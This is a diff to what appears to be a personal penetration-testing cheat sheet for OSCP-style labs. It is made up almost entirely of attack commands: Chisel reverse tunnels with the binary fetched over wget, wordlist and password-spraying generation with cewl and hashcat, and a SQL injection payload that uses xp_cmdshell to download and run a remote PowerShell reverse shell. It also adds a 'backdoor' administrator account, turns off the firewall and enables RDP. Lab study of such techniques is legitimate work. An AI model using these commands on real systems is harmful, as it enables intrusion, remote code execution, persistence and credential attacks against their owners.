@@ -37,17 +37,17 @@ Access remote localhost with Chisel:
 
 ```bash
 # Remote machine has internal program running on 8080
-chisel server -p 6969 --reverse
+chisel server -p 5000 --reverse
 cd /opt/linux
 python -m http.server 80
 
 wget 192.168.45.178:8000/chisel
 chmod 777 chisel
-./chisel client 192.168.45.221:6969 R:4444:localhost:8080
+./chisel client 192.168.45.221:5000 R:4444:localhost:8080
 
-wget 10.10.14.8:8000/chisel
+wget 10.10.14.11:8000/chisel
 chmod 777 chisel
-./chisel client 10.10.14.8:6969 R:4444:localhost:8080
+./chisel client 10.10.14.11:5000 R:8000:127.0.0.1:8000
 
 # Now i can access it on local machine port 4444
 ```
@@ -61,6 +61,11 @@ Add-LocalGroupMember -Group Administrators -Member ariah
 Custom password list:
 
 ```bash
+cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
+cat users.txt >> custom-wordlist.txt
+echo "summer\nwinter\nspring\nfall\n$dom" >> custom-wordlist.txt
+hashcat --stdout -a 0 -r ~/repos/offsec/customizations/bdg.rule custom-wordlist.txt | awk '!a[$0]++ {print $0}' >> custom-passwords.txt
+
 hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule pass.txt > pass-best64.txt
 hashcat --stdout -a 0 -r /usr/share/hashcat/rules/bdg.rule pass.txt > passwords.txt
 awk 'length($0) >= 7' passwords.txt > tmp_passwords.txt && awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' tmp_passwords.txt users.txt | grep -P '[A-Z]' | grep -P '[^a-zA-Z0-9]' > combined.txt && rm tmp_passwords.txt
@@ -108,6 +113,15 @@ Get-Process -Id (Get-NetTCPConnection -LocalPort port).OwningProcess
 Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
 ```
 
+Investigate Process.
+
+```bash
+Get-NetTCPConnection | Where-Object { $_.State -eq "LISTEN" } | select @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}, 127.0.0.1, 8000
+Get-Process -Id (Get-NetTCPConnection -LocalPort 8000).OwningProcess
+Get-Process -Id (Get-NetUDPEndpoint -LocalPort 8000).OwningProcess
+netstat -a -b
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
@@ -141,7 +155,7 @@ Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:ms01.oscp.exam"
 # Create Another Admin for RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 netsh advfirewall set allprofiles state off
-net user /add backdoor Password123
+net user /add backdoor Password123!
 net localgroup administrators /add backdoor
 net localgroup "Remote Desktop Users" backdoor /add
 xfreerdp /v:192.168.140.101 /u:backdoor /p:Password123 /cert:ignore +clipboard
